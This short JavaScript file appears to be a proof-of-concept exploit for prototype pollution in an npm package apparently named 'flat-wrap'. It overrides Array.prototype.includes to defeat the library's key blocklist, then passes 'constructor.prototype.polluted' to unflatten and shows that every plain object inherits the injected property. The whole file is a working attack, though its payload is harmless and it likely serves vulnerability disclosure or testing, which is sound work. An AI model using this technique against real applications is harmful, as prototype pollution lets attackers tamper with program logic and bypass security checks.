Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
const {unflatten} = require('flat-wrap');
console.log({}.polluted);
unflatten({ 'constructor.prototype.polluted': 'yes' });
console.log({}.polluted);